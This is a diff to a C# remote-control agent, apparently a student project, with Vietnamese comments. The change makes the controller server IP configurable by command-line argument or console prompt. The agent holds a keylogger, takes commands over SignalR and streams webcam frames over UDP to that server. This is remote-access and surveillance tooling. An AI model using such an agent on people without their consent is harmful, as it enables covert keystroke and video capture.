@@ -12,6 +12,7 @@ using RCS.Agent.Services;
 using RCS.Agent.Services.Windows;
 using RCS.Common.Models;
 using RCS.Common.Protocols;
+using System.Net;
 using System;
 using System.Net.Sockets;
 using System.Threading;
@@ -21,20 +22,26 @@ namespace RCS.Agent
 {
     class Program
     {
-        #region --- CONFIGURATION (CẤU HÌNH HỆ THỐNG) ---
+       #region --- CONFIGURATION (CẤU HÌNH HỆ THỐNG) ---
 
-        // Thông tin định danh và kết nối SignalR
-        private const string AGENT_ID = "Agent_12345";
-        private const string SERVER_URL = "http://localhost:5000/agenthub";
+        // Thông tin định danh
+        public const string AGENT_ID = "Agent_12345";
+        
+        // Cấu hình Mặc định (Fallback)
+        private const string DEFAULT_SERVER_HOST = "127.0.0.1";
+        private const int SERVER_TCP_PORT = 5000;  // Port SignalR
+        private const int SERVER_UDP_PORT = 6000;  // Port Video
 
-        // Cấu hình UDP Streaming (Gửi video)
-        private const string SERVER_UDP_HOST = "localhost";
-        private const int SERVER_UDP_PORT = 6000;
-        private const int MAX_PACKET_SIZE = 45000; // Kích thước gói tin tối đa (MTU Safe ~65k, để 45k cho an toàn)
+        // Cấu hình UDP Streaming
+        private const int MAX_PACKET_SIZE = 45000; 
 
-        // Cấu hình FPS (Frame Per Second) cho Webcam
+        // Cấu hình FPS (Frame Per Second)
         public const int FRAME_PER_SECOND = 60;
-        public const int SECOND_PER_FRAME = 1000 / FRAME_PER_SECOND; // ~16ms mỗi frame
+        public const int SECOND_PER_FRAME = 1000 / FRAME_PER_SECOND; 
+
+        // Biến lưu cấu hình động (Sẽ được gán khi chạy)
+        public static string SERVER_URL_FINAL;      // URL đầy đủ cho SignalR
+        public static string CURRENT_SERVER_IP;     // IP trần cho UDP
 
         #endregion
 
@@ -49,9 +56,9 @@ namespace RCS.Agent
         private static Keylogger _keylogger;
 
         // Biến phục vụ Streaming
-        private static CancellationTokenSource _webcamCts; // Token để hủy luồng quay video
-        private static UdpClient _udpClient;               // Client gửi dữ liệu qua UDP
-        private static int _frameSequence = 0;             // ID của khung hình (tăng dần)
+        private static CancellationTokenSource _webcamCts; 
+        private static UdpClient _udpClient;               
+        private static int _frameSequence = 0;   
 
         #endregion
 
@@ -60,16 +67,55 @@ namespace RCS.Agent
         static async Task Main(string[] args)
         {
             Console.Title = $"RCS Agent - {AGENT_ID}";
+            Console.WriteLine("=== RCS AGENT LAUNCHER ===");
 
-            // 1. Khởi tạo tất cả các dịch vụ
+            // --- LOGIC XÁC ĐỊNH IP SERVER (LOGIN LOGIC) ---
+
+            // Trường hợp 1: Có tham số dòng lệnh (vd: Agent.exe 192.168.1.50)
+            if (args.Length > 0 && IPAddress.TryParse(args[0], out _))
+            {
+                CURRENT_SERVER_IP = args[0];
+                Console.WriteLine($"[Config] Auto-detected IP from args: {CURRENT_SERVER_IP}");
+            }
+            // Trường hợp 2: Không có tham số -> Hỏi người dùng
+            else
+            {
+                Console.Write($"Enter Server IP (Default: {DEFAULT_SERVER_HOST}): ");
+                string input = Console.ReadLine();
+
+                if (!string.IsNullOrWhiteSpace(input))
+                {
+                    // Tạm chấp nhận input là IP hoặc domain
+                    CURRENT_SERVER_IP = input.Trim();
+                }
+                else
+                {
+                    CURRENT_SERVER_IP = DEFAULT_SERVER_HOST;
+                    Console.WriteLine($"[Config] No input provided. Using localhost.");
+                }
+            }
+
+            // Tạo chuỗi kết nối chuẩn
+            SERVER_URL_FINAL = $"http://{CURRENT_SERVER_IP}:{SERVER_TCP_PORT}/agenthub";
+            
+            Console.WriteLine($"---------------------------------------------");
+            Console.WriteLine($"Target Server: {CURRENT_SERVER_IP}");
+            Console.WriteLine($"SignalR URL  : {SERVER_URL_FINAL}");
+            Console.WriteLine($"UDP Target   : {CURRENT_SERVER_IP}:{SERVER_UDP_PORT}");
+            Console.WriteLine($"---------------------------------------------");
+
+            // --- BẮT ĐẦU KHỞI TẠO ---
+
+            // 1. Khởi tạo dịch vụ
             InitializeServices();
 
-            // 2. Kết nối tới Server điều khiển
+            // 2. Kết nối tới Server
+            Console.WriteLine("Connecting to Server...");
             await _signalRClient.ConnectAsync(AGENT_ID);
 
             Console.WriteLine("Agent is running. Press CTRL+C to exit.");
 
-            // 3. Giữ ứng dụng chạy vô hạn (tránh việc Main thoát ngay lập tức)
+            // 3. Giữ ứng dụng chạy
             await Task.Delay(-1);
         }
 
@@ -84,7 +130,7 @@ namespace RCS.Agent
             _udpClient = new UdpClient();
 
             // Khởi tạo SignalR và đăng ký sự kiện nhận lệnh
-            _signalRClient = new SignalRClient(SERVER_URL);
+            _signalRClient = new SignalRClient(SERVER_URL_FINAL);
             _signalRClient.OnCommandReceived += HandleCommand;
         }
 
@@ -272,7 +318,7 @@ namespace RCS.Agent
                     Array.Copy(imageBytes, offset, packet, HEADER_SIZE, size);
 
                     // Gửi gói tin đi
-                    await _udpClient.SendAsync(packet, packet.Length, SERVER_UDP_HOST, SERVER_UDP_PORT);
+                    await _udpClient.SendAsync(packet, packet.Length, CURRENT_SERVER_IP, SERVER_UDP_PORT);
                 }
             }
             catch { }
